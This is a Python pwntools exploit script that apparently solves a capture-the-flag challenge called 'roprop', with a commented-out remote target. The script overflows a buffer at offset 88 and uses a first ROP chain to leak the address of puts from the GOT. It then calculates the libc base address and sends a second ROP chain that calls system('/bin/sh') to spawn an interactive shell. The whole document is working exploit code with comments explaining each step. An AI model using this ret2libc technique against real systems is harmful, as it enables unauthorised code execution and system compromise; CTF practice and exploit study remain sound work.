from pwn import *
context.arch = 'amd64'

context.terminal = 'terminator'
offset = 88 #found by creating pattern in gdb
elf = ELF("./roprop")
p = process("./roprop")
#p = remote("pwn.darkarmy.xyz", 5002)

#receiving initial text from the program
print(p.recvuntil("\n"))
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")

#create first rop chain
#calls puts with the got address of puts as a parameter,
#and jumps back to main after
rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["main"])


#sending first rop chain
payload = b"A"*offset
payload += rop.chain()
p.sendline(payload)

#receive/format leaked address of puts from the remote host
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts found at {hex(puts)}")

#found the libc version from the leaked address of puts
#libc = ELF("libc6_2.27-3ubuntu1.2_amd64.so") Server libc for the challenge

#leaked libc when running on my system, replace the line below with your leaked libc version
libc = ELF("libc6_2.31-2_amd64.so") #leaked libc when running on my system, replace this with your leaked libc
libc.address = puts - libc.symbols["puts"] #leaked puts - offset of puts = libc base address
log.info(f"Libc base address determined {hex(libc.address)}")

#receive initial text again after jumping back to main
print(p.recvuntil("\n"))
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")

#second rop chain, calling system
rop = ROP(libc)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop.system(next(libc.search(b"/bin/sh\x00")))
rop.call("exit")

#sending second rop chain, should result in a shell
payload = b"A"*offset
payload += rop.chain()
p.sendline(payload)

p.interactive()
